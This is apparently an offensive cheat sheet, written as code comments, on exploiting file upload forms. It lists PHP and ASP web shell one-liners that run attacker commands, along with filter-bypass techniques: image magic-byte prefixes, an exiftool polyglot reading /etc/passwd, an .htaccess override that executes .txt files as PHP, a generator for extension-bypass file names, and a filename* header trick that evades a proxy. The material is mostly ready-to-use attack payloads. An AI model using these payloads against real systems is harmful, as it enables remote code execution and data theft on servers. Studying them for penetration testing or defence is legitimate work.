// File Upload
//! payloads
//* php
// <?php passthru($_GET['cmd']); ?>
//* asp
// <% eval request('cmd') %>
//! Filter bypass
//* bypass image filtering easy mode
// GIF89a # indicates the start of a GIF file
// ÿØÿà # indicates the start of a JPEG file
// <?php passthru($_GET['cmd']); ?>
//* bypass image filteing hard mode
// exiftool -Comment="<?php echo system('cat /etc/passwd'); ?>" img.jpg -o polyglot.php
//* bypass .php extension filtering
// on apache server we need to override the .htaccess file with
// #define width 16 => just to be accepted as image
// #define height 7
// <FilesMatch \.txt$> => execute .txt files as .php files
//         SetHandler application/x-httpd-php
// </FilesMatch>
// then upload the actual file file.txt
// GIF89a
// <?php passthru($_GET['cmd']); ?>
//* bypass php extension filtering by find another similar extension
// you can brute force using :
// https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt
//* bypass extention filtering by using encoding & special characters
//for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\\\' '.' '…' ':'; do
//    for ext in '.php' '.phps'; do
//        echo "shell$char$ext.jpg" >> wordlist.txt
//        echo "shell$ext$char.jpg" >> wordlist.txt
//        echo "shell.jpg$char$ext" >> wordlist.txt
//        echo "shell.jpg$ext$char" >> wordlist.txt
//    done
//done
//* bypass whitlist only extensions
// by adding filename with extended filename*
// ex:
// filename="image.png";
//  filename*=UTF-8''attack.svg
// if there is a reverse proxy doing the filtering, it might see the first filename
// and the server will see the second one
// the space at the beginning of the filename* makes the reverse proxy not interpret it
// the results uploading attack.svg as an image


